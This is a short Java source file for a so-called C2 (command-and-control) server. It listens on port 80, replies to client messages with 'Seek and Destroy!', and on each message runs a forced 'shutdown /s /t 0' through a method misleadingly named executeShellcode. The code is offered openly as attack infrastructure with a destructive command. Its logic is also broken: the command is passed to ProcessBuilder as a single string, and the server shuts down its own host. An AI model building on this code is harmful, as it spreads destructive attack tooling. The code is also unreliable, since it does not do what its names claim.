import java.io.*;
import java.net.*;

public class C2Server {
    public static void main(String[] args) {
        int port = 80;
        try (ServerSocket serverSocket = new ServerSocket(port)) {
            System.out.println("C2 Connection is listening on port" + port);
            while (true) {
                Socket socket = serverSocket.accept();
                System.out.println("Client connected!");
                InputStream input = socket.getInputStream();
                BufferedReader reader = new BufferedReader(new InputStreamReader(input));
                OutputStream output = socket.getOutputStream();
                PrintWriter writer = new PrintWriter(output, true);
                String message;
                while (((message = reader.readLine()) != null)) {
                    System.out.println("Client: " + message);
                    writer.println("Command received: " + message + "Seek and Destroy!");
                    // Implement logic to launch a payload.
                    executeShellcode("shutdown /s /t 0");
                }
                socket.close();
                System.out.println("Client disconnected.");
            }
        } catch (IOException ex) {
            System.out.println("C2 Server error: " + ex.getMessage());
            ex.printStackTrace();
        }
    }

    private static void executeShellcode(String command) {
        System.out.println("Launching shellcode with command: " + command);
        try {
            ProcessBuilder processBuilder = new ProcessBuilder(command);
            processBuilder.inheritIO();
            Process process = processBuilder.start();
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            System.out.println("Error executing command." + e.getMessage());
            e.printStackTrace();
        }
    }
}
